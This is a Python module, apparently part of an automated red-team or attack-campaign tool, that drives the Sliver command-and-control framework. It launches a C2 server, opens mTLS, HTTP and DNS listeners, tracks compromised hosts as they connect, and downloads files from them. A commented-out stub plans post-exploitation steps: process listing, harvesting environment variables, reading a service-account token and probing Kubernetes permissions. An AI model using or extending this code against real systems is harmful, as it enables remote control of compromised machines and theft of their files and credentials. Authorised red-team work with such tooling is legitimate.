from asyncio import Queue
import asyncio
from enum import Enum, auto
from subprocess import Popen
import gzip
from typing import Callable
from domain import events
import domain
from domain.events import Event
import grpc
from sliver import SliverClientConfig, SliverClient
from sliver.client import client_pb2
from pathlib import Path

DEFAULT_CONFIG = Path("~/.sliver-client/configs/default.cfg")

LISTENER_PORT = 8888

SliverEvent = client_pb2.Event
SliverSession  = client_pb2.Session



async def get_c2_client() -> SliverClient:
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG.expanduser())
    client = SliverClient(config)
    await client.connect()
    return client


async def setup_c2_session(queue: Queue, c2_start_cmd: str):
    kill_c2 = await prepare_c2(c2_start_cmd)
    client = await get_c2_client()

    host = "0.0.0.0"
    port = 8888
    mtls_listener = await client.start_mtls_listener(host=host, port=port)
    await queue.put(events.ListenerReady(type="mTLS", host=host, port=port))

    async for event in client.events():
        e = await parse_event(event)
        if e is not None:
            await queue.put(e) 

    if kill_c2 is not None:
        kill_c2()


async def parse_event(event: SliverEvent) -> Event | None:
    print("🤿 " + str(event.EventType))

    match event.EventType:
        case "session-connected":
            system = await parse_session(event.Session)
            return events.SessionConnected(session_id=event.Session.ID, system=system)

        case "session-disconnected":
            return events.SessionDisconnected(session_id=event.Session.ID, system_name=event.Session.Hostname)
        case _:
            print("Unhandled event: " + str(event))
    return None

async def parse_session(session: SliverSession) -> domain.System:
    sys  = domain.System(name=session.Hostname, ip=session.RemoteAddress, username=session.Username, os=session.OS, version=session.Version, transport=session.Transport,)
    return sys


async def get_file(client: SliverClient, session_id:str, path:str) -> str| None:
    session  =  await client.interact_session(session_id)
    try:
        data = await session.download(path)
        file = gzip.decompress(data.Data)
        return file.strip()
    except grpc.aio._call.AioRpcError as exc:
        print(f"Error getting file: {exc.details()}")
    return None


async def get_sessions():
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG.expanduser())

    client = SliverClient(config)
    print("[*] Connected to server ...")
    await client.connect()
    sessions = await client.sessions()
    print("[*] Sessions: %r" % sessions)
    return [{"address": s.RemoteAddress, "name": s.Hostname} for s in sessions]


class ListenerType(Enum):
    DNS = auto()
    HTTP = auto()
    mTLS = auto()


async def create_listener(listener_type: ListenerType = ListenerType.mTLS) -> int | None:
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG.expanduser())
    client = SliverClient(config)
    await client.connect()
    listener = None
    match listener_type:
        case ListenerType.mTLS:
            listener = await client.start_mtls_listener(port=LISTENER_PORT)
        case ListenerType.HTTP:
            listener = await client.start_http_listener(port=LISTENER_PORT)
        case ListenerType.DNS:
            listener = await client.start_dns_listener()  # use canonical DNS port
        case _:
            return print("Listener not yet supported")

    return listener.JobID if listener is not None else None


async def prepare_c2(start_cmd: str) -> Callable | None:
    print("Starting C2 server")
    try:
        proc = Popen(start_cmd.split(" "))
        # ensure the server starts before letting the client connect
        await asyncio.sleep(1)
        return proc.kill
    except Exception as exc:
        print(f"Could not start C2 server: {exc}")
    return None


async def interactive_actions(action, session_id: str):
    pass
    # TODO: this function is not working; taken from old campaign, not yet converted
    # session = await self.c2_client.interact_session(session_id)
    # # TODO do the mapping of actions to the actual function calls in the C2 wrapper
    # match action:
    #     case "ps":
    #         process_list = await session.ps()
    #         break
    #     case "pwd":
    #         working_dir = await session.pwd()
    #         break
    #     case "env":
    #         env_vars = await session.get_env()
    #         # TODO extract useful entries from ENV var
    #         #    - come up with heuristics to identify relevant entries?
    #         break
    #     case "ifconfig":
    #         ifconfig = await session.ifconfig()
    #         break
    #     case "get_file":
    #         path = args[0] if len(args) > 0 else None
    #         file = await sliver_wrapper.get_file(self.c2_client, session_id=session_id, path=args[0])
    #         break
    #     case exe if exe is not None and exe.startswith("cat"):
    #         print("SA token: ")
    #         break
    #     case _:
    #         print(f"unhandled action '{action}'")

                    # TODO: add action to check `kubectl auth can-i --list` with the given token
